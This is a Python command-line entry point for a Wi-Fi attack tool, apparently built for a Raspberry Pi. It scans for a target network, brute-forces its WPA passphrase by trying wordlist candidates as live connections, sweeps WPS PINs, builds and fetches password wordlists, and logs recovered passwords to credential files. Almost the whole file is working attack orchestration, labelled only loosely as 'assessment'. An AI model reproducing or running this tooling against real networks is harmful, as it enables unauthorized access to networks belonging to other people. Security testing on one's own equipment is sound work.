"""__main__.py - single CLI entry point: python -m piwps <command>.

Commands: recon | psk | wps | dashboard | migrate | setup-radio | words
"""
import argparse
import datetime
import json
import os
import sys
import time

from . import config
from .radio import ensure_wlan1, wlan0_healthy, wlan0_status
from .scan import scan, sec_of, strongest
from .state import DoneLog, RunBudget, StatusWriter, filter_done, migrate_old_run
from .attacks import psk as psk_attack
from .attacks import wps as wps_attack
from .report import write_result, write_creds, audit_markdown
from . import wordlists


def _logger(outdir):
    os.makedirs(outdir, exist_ok=True)
    logf = open(os.path.join(outdir, "pwn.log"), "a", buffering=1)

    def log(msg):
        line = f"{datetime.datetime.now().isoformat(timespec='seconds')} {msg}"
        print(line, flush=True)
        logf.write(line + "\n")
    return log


def _require_root(log):
    if os.geteuid() != 0:
        log("[!] must run as root (sudo)")
        return False
    return True


def _wait_for_target(log, outdir, ssid, budget_left):
    deadline = time.time() + min(25 * 60, budget_left * 0.25)
    while time.time() < deadline:
        nets = scan()
        with open(os.path.join(outdir, "scan.json"), "w") as f:
            json.dump({"at": datetime.datetime.now().isoformat(), "nets": nets}, f, indent=2)
        target = strongest(nets, ssid)
        if target:
            log(f"[*] target found: {target}")
            return target, nets
        log(f"[*] waiting for '{ssid}'... visible={[n['ssid'] for n in nets][:8]}")
        if not wlan0_healthy():
            log("[!] wlan0 disturbed during scan - aborting")
            return None, nets
        time.sleep(15)
    log(f"[!] target '{ssid}' never appeared")
    return None, []


def cmd_setup_radio(a):
    ok = ensure_wlan1()
    print("wlan1 ready" if ok else "wlan1 FAILED")
    return 0 if ok else 1


def cmd_recon(a):
    log = _logger(a.out)
    if not _require_root(log):
        return 1
    if not ensure_wlan1():
        return 1
    nets = scan()
    with open(os.path.join(a.out, "scan.json"), "w") as f:
        json.dump({"at": datetime.datetime.now().isoformat(), "nets": nets}, f, indent=2)
    for n in sorted(nets, key=lambda x: str(x.get("ssid"))):
        print(f"{n['ssid'] or '<hidden>':22} {n['bssid']} sig={n['signal']} {n['flags']}")
    return 0


def cmd_psk(a):
    log = _logger(a.out)
    if not _require_root(log):
        return 1
    if not wlan0_healthy():
        log(f"[!] wlan0 not healthy at start: {wlan0_status()}")
        return 2
    budget = RunBudget(os.path.join(a.out, "run.json"), a.time, a.target, a.words)
    left = budget.left_seconds()
    if left <= 0:
        log("[*] total time budget already exhausted - exiting")
        return 6
    log(f"[*] wlan0 healthy - starting, target={a.target} budget_left={left/60:.1f}min")
    target, _ = _wait_for_target(log, a.out, a.target, left)
    if not target:
        return 4
    sec = sec_of(target["flags"])
    log(f"[*] target security: {sec} flags={target['flags']}")
    result = {"target": a.target, "bssid": target["bssid"], "security": sec,
              "found_at": datetime.datetime.now().isoformat(),
              "password": None, "wlan0_intact": True}
    status = StatusWriter(os.path.join(a.out, "status.json"))
    done = DoneLog(os.path.join(a.out, "done.log"))
    if sec == "OPEN":
        ok, info = psk_attack.attempt(a.target, "", key_mgmt="NONE",
                                      bssid=target["bssid"], freq=target["freq"])
        log(f"[*] OPEN connect: ok={ok} {info}")
        if ok:
            result["password"] = "<OPEN-NO-PASSWORD>"
    else:
        with open(a.words, errors="ignore") as f:
            cands = [ln.rstrip("\n").strip() for ln in f
                     if ln.strip() and not ln.strip().startswith("#")]
        log(f"[*] loaded {len(cands)} candidates from {a.words}")
        if not cands:
            log("[!] empty wordlist")
            return 5
        if a.resume:
            seen = done.load()
            skipped = len(seen)
            cands = filter_done(cands, seen)
            log(f"[*] resume: skipping {skipped} already-tried, {len(cands)} remain")
        else:
            try:
                os.remove(done.path)
            except Exception:
                pass
        total = len(cands) + len(done.load())
        t_end = budget.run["first_start"] + budget.run["budget_min"] * 60
        tried = total - len(cands)
        km = psk_attack.key_mgmt_for(target["flags"])
        status.write(target=a.target, tried=tried, total=total, current="-",
                     ok_last=False, started_iso=budget.started_iso(),
                     budget_min=budget.run["budget_min"],
                     budget_left_min=round((t_end - time.time()) / 60, 1), found=None)
        for w in cands:
            if time.time() > t_end:
                log("[*] time budget exhausted")
                break
            if not wlan0_healthy():
                log("[!] wlan0 disturbed mid-attack - stopping")
                result["wlan0_intact"] = False
                break
            tried += 1
            ok, info = psk_attack.attempt(a.target, w, key_mgmt=km, wait_s=a.wait,
                                          bssid=target["bssid"], freq=target["freq"])
            done.append(w)
            status.write(target=a.target, tried=tried, total=total, current=w, ok_last=ok,
                         started_iso=budget.started_iso(), budget_min=budget.run["budget_min"],
                         budget_left_min=round((t_end - time.time()) / 60, 1),
                         found=w if ok else None)
            if tried % 25 == 0 or ok:
                log(f"[{tried}/{total}] try {w!r}: ok={ok} {info} "
                    f"wlan0={wlan0_status().get('ssid')}")
            if ok:
                result["password"] = w
                log(f"[+] SUCCESS {a.target} : {w}")
                break
        result["tried"] = tried
    result["wlan0_final"] = wlan0_status()
    result["wlan0_intact"] = wlan0_healthy()
    write_result(a.out, result)
    if result["password"]:
        write_creds(a.out, a.target, result["password"])
        log(f"[DONE] PASSWORD: {a.target}:{result['password']} | wlan0 intact={result['wlan0_intact']}")
    else:
        log(f"[DONE] password NOT found. wlan0 intact={result['wlan0_intact']}")
    return 0


def cmd_wps(a):
    log = _logger(a.out)
    if not _require_root(log):
        return 1
    pins = []
    for prof in (a.profile or "extended").split(","):
        prof = prof.strip()
        if prof.startswith("pins:"):
            pins += [p.strip() for p in prof[5:].split(",") if p.strip()]
        elif prof in wps_attack.PROFILES:
            pins += wps_attack.PROFILES[prof]
        else:
            log(f"[!] unknown profile '{prof}' (have: {sorted(wps_attack.PROFILES)})")
            return 2
    res = wps_attack.sweep(a.bssid, a.ssid, pins, a.out, log, wait_s=a.wait)
    if res.get("pin"):
        write_creds(a.out, a.ssid, f"WPS-PIN-{res['pin']} / PSK={res.get('psk')}")
        log(f"[+] WPS SUCCESS PIN={res['pin']} PSK={res.get('psk')} IP={res.get('ip')}")
        return 0
    log(f"[DONE] WPS no hit: {res}")
    return 1 if res.get("reason") != "locked" else 3


def cmd_dashboard(a):
    from .web.app import main as serve
    serve(["--port", str(a.port), "--dir", a.dir])
    return 0


def cmd_migrate(a):
    res = migrate_old_run(a.out, a.words, a.time)
    print(f"migrated: {res}")
    return 0


def cmd_words(a):
    if a.action == "hint":
        cands = wordlists.hint_candidates()
    elif a.action == "mangle":
        ssids = a.ssids.split(",") if a.ssids else wordlists.B1_SSIDS
        cands = wordlists.mangle(ssids=ssids)
    elif a.action == "fetch":
        cands = wordlists.filter_lengths(wordlists.fetch_lines(a.url, timeout=a.timeout))
    elif a.action == "merge":
        lists = []
        for path in a.files:
            with open(path, errors="ignore") as f:
                lists.append([ln.strip() for ln in f if ln.strip()])
        cands = wordlists.merge(*lists)
    else:
        print(f"unknown words action: {a.action}")
        return 2
    with open(a.output, "w") as f:
        f.write("\n".join(cands) + ("\n" if cands else ""))
    print(f"wrote {len(cands)} -> {a.output}")
    return 0


def build_parser():
    p = argparse.ArgumentParser(prog="piwps", description="Dual-STA WiFi assessment (wlan0 untouched)")
    sub = p.add_subparsers(dest="cmd", required=True)
    s = sub.add_parser("setup-radio", help="create wlan1 + isolated supplicant")
    s.set_defaults(fn=lambda a: cmd_setup_radio(a))
    r = sub.add_parser("recon", help="passive scan to scan.json")
    r.add_argument("--out", default="./results")
    r.set_defaults(fn=cmd_recon)
    k = sub.add_parser("psk", help="WPA passphrase attack")
    k.add_argument("--target", required=True)
    k.add_argument("--time", type=int, default=100, help="total budget minutes (shared across resumes)")
    k.add_argument("--out", default="./results")
    k.add_argument("--words", required=True)
    k.add_argument("--wait", type=float, default=config.TRY_WAIT_S)
    k.add_argument("--resume", dest="resume", action="store_true", default=True)
    k.add_argument("--no-resume", dest="resume", action="store_false")
    k.set_defaults(fn=cmd_psk)
    w = sub.add_parser("wps", help="WPS PIN sweep")
    w.add_argument("--bssid", required=True)
    w.add_argument("--ssid", required=True)
    w.add_argument("--out", default="./results-wps")
    w.add_argument("--profile", default="extended",
                   help="comma list of defaults,vendor,extended,all or pins:1,2,3")
    w.add_argument("--wait", type=int, default=config.WPS_WAIT_S)
    w.set_defaults(fn=cmd_wps)
    d = sub.add_parser("dashboard", help="serve live web UI")
    d.add_argument("--port", type=int, default=8080)
    d.add_argument("--dir", default="./results-b1-48h")
    d.set_defaults(fn=cmd_dashboard)
    m = sub.add_parser("migrate", help="convert old run to resume state")
    m.add_argument("--out", required=True)
    m.add_argument("--words", required=True)
    m.add_argument("--time", type=int, default=2880)
    m.set_defaults(fn=cmd_migrate)
    g = sub.add_parser("words", help="build wordlists")
    g.add_argument("action", choices=["hint", "mangle", "fetch", "merge"])
    g.add_argument("--ssids", default="")
    g.add_argument("--url", default="")
    g.add_argument("--timeout", type=int, default=60)
    g.add_argument("--files", nargs="*", default=[])
    g.add_argument("--output", required=True)
    g.set_defaults(fn=cmd_words)
    return p


def main(argv=None):
    a = build_parser().parse_args(argv)
    return a.fn(a)


if __name__ == "__main__":
    sys.exit(main())
